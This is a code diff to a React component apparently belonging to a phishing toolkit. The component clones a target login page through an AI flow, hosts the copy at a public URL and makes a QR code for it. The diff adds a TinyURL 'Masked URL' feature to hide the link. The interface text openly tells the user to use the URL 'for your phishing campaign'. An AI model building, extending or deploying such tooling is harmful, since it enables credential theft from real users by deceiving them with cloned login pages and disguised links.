@@ -9,9 +9,10 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
-import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe } from 'lucide-react';
-import { cloneLoginPage, type PageClonerOutput } from '@/ai/flows/page-cloner-flow';
+import { Loader2, AlertTriangle, Link as LinkIcon, Download, RefreshCw, Bot, Globe, Copy, Wand } from 'lucide-react';
+import { cloneLoginPage } from '@/ai/flows/page-cloner-flow';
 import { hostClonedPage, type HostClonedPageOutput } from '@/ai/flows/host-cloned-page-flow';
+import { shortenUrl } from '@/services/url-shortener-service';
 import { useToast } from '@/hooks/use-toast';
 import { QrCodeGenerator } from './qr-code-generator';
 import { Label } from './ui/label';
@@ -25,9 +26,11 @@ export function LoginPageCloner() {
   const { toast } = useToast();
   const [clonedHtml, setClonedHtml] = useState<string | null>(null);
   const [hostedPage, setHostedPage] = useState<HostClonedPageOutput | null>(null);
+  const [shortUrl, setShortUrl] = useState<string | null>(null);
   
   const [isCloning, setIsCloning] = useState(false);
   const [isHosting, setIsHosting] = useState(false);
+  const [isShortening, setIsShortening] = useState(false);
   
   const [clonerError, setClonerError] = useState<string | null>(null);
 
@@ -39,11 +42,16 @@ export function LoginPageCloner() {
     },
   });
 
+  const resetState = () => {
+      setClonedHtml(null);
+      setHostedPage(null);
+      setShortUrl(null);
+      setClonerError(null);
+  }
+
   async function onClonerSubmit(values: z.infer<typeof pageClonerSchema>) {
     setIsCloning(true);
-    setClonedHtml(null);
-    setHostedPage(null);
-    setClonerError(null);
+    resetState();
     try {
       const response = await cloneLoginPage(values);
       setClonedHtml(response.htmlContent);
@@ -61,6 +69,7 @@ export function LoginPageCloner() {
     if (!clonedHtml) return;
     setIsHosting(true);
     setHostedPage(null);
+    setShortUrl(null);
     setClonerError(null);
     try {
       const response = await hostClonedPage({ htmlContent: clonedHtml });
@@ -73,6 +82,27 @@ export function LoginPageCloner() {
     } finally {
       setIsHosting(false);
     }
+  };
+
+  const handleShortenUrl = async () => {
+      if (!hostedPage?.publicUrl) return;
+      setIsShortening(true);
+      setClonerError(null);
+      try {
+        const response = await shortenUrl(hostedPage.publicUrl);
+        if (response.success && response.shortUrl) {
+            setShortUrl(response.shortUrl);
+            toast({ title: "URL Shortened", description: "Masked link created with TinyURL." });
+        } else {
+            throw new Error(response.error || 'Failed to shorten URL.');
+        }
+      } catch (err) {
+        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
+        setClonerError(errorMessage);
+        console.error(err);
+      } finally {
+        setIsShortening(false);
+      }
   };
 
   const handleDownloadHtml = () => {
@@ -88,6 +118,11 @@ export function LoginPageCloner() {
       URL.revokeObjectURL(url);
       toast({ title: "Download Started", description: "Your cloned HTML file is downloading." });
     }
+  };
+
+  const handleCopy = (textToCopy: string) => {
+    navigator.clipboard.writeText(textToCopy);
+    toast({ title: "Copied!", description: "URL copied to clipboard." });
   }
 
   return (
@@ -124,18 +159,18 @@ export function LoginPageCloner() {
         </Card>
         {clonerError && <Card className="border-destructive/50"><CardHeader><div className="flex items-center gap-3"><AlertTriangle className="h-6 w-6 text-destructive" /><CardTitle className="text-destructive">Action Failed</CardTitle></div></CardHeader><CardContent><p>{clonerError}</p></CardContent></Card>}
         
-        {hostedPage && (
-          <QrCodeGenerator url={hostedPage.publicUrl} />
+        {(hostedPage || shortUrl) && (
+          <QrCodeGenerator url={shortUrl ?? hostedPage!.publicUrl} />
         )}
       </div>
 
       <div className="lg:col-span-3">
-        <Card className="min-h-[400px]">
+        <Card className="min-h-full">
           <CardHeader>
             <CardTitle>Hosted Page Information</CardTitle>
             <CardDescription>Use the public URL for your phishing campaign. Open it in a new tab to test.</CardDescription>
           </CardHeader>
-          <CardContent className="w-full">
+          <CardContent className="w-full space-y-4">
             {(isCloning || isHosting) && <div className="flex items-center justify-center h-96"><Loader2 className="h-8 w-8 animate-spin text-muted-foreground" /></div>}
             
             {!clonedHtml && !isCloning && (
@@ -154,12 +189,32 @@ export function LoginPageCloner() {
             )}
 
             {hostedPage && (
-              <div className="space-y-4">
+              <div className="space-y-4 animate-in fade-in">
                 <div className="space-y-2">
-                  <Label htmlFor="public-url">Hosted Page URL</Label>
-                  <Input id="public-url" readOnly value={hostedPage.publicUrl} className="font-mono"/>
-                  <p className="text-sm text-muted-foreground">This is a publicly accessible, shareable link to your phishing page.</p>
+                  <Label htmlFor="public-url">Raw Public URL</Label>
+                   <div className="flex items-center gap-2">
+                        <Input id="public-url" readOnly value={hostedPage.publicUrl} className="font-mono"/>
+                        <Button variant="ghost" size="icon" onClick={() => handleCopy(hostedPage.publicUrl)}><Copy className="h-4 w-4"/></Button>
+                   </div>
+                  <p className="text-xs text-muted-foreground">This is the direct, unmasked link to your cloned page.</p>
                 </div>
+
+                {!shortUrl && (
+                    <Button onClick={handleShortenUrl} disabled={isShortening} className="w-full">
+                        {isShortening ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Wand className="mr-2 h-4 w-4"/>}
+                        Create Short Link
+                    </Button>
+                )}
+                
+                 {shortUrl && (
+                  <div className="space-y-2 animate-in fade-in">
+                    <Label htmlFor="short-url">Masked URL (TinyURL)</Label>
+                    <div className="flex items-center gap-2">
+                        <Input id="short-url" readOnly value={shortUrl} className="font-mono text-accent"/>
+                        <Button variant="ghost" size="icon" onClick={() => handleCopy(shortUrl)}><Copy className="h-4 w-4"/></Button>
+                   </div>
+                  </div>
+                )}
               </div>
             )}
           </CardContent>
